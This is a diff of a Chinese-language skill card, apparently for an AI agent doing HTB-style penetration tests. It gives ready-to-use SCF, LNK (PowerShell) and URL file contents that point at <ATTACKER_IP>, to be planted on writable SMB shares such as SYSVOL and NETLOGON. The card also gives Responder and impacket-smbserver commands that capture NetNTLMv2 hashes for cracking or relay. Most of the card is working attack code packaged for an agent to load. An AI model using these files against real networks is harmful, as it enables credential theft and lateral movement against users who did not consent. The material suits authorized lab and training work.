@@ -4,7 +4,7 @@ description: 'SCF/LNK/URL文件投放→NTLM hash窃取。HTB最常见''可写�
 disable-model-invocation: true
 metadata: { domain: ad-win, tier: T2 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+> 📌 DSH 用法：按卡名用 skill 工具加载；长任务用 bash 后台任务、并行侦察用 subagent。
 
 ## SCF / LNK / URL 文件 NTLM 窃取
 
@@ -14,12 +14,12 @@ metadata: { domain: ad-win, tier: T2 }
 在可写 SMB 共享上放置特制的 `.scf`、`.lnk`、`.url` 文件。当用户（或服务）浏览该共享时，Windows 自动尝试连接文件中指定的图标/SMB 路径，触发 NTLM 认证 → Responder 捕获 NetNTLMv2 hash → 破解或中继。
 
 ### SCF 文件（最可靠）
-```
+```text
 [Shell]
 Command=2
 IconFile=\\<ATTACKER_IP>\share\icon.ico
 IconIndex=1
-```
+```text
 保存为 `@whatever.scf`（@ 确保排序在最前）。
 
 ### LNK 文件（PowerShell 生成）
@@ -29,15 +29,15 @@ $lnk = $objShell.CreateShortcut("C:\path\to\shortcut.lnk")
 $lnk.TargetPath = "\\<ATTACKER_IP>\share\file"
 $lnk.IconLocation = "\\<ATTACKER_IP>\share\icon.ico"
 $lnk.Save()
-```
+```text
 
 ### URL 文件
-```
+```text
 [InternetShortcut]
 URL=file://<ATTACKER_IP>/share/file
 IconFile=\\<ATTACKER_IP>\share\icon.ico
 IconIndex=0
-```
+```text
 保存为 `@readme.url`。
 
 ### Kali 接收端
@@ -45,7 +45,7 @@ IconIndex=0
 sudo responder -I tun0 -v
 # 或
 sudo impacket-smbserver -smb2support share /tmp/share
-```
+```text
 
 ### 可投放位置
 - 可写 SMB 共享（SYSVOL, NETLOGON, 自定义共享）
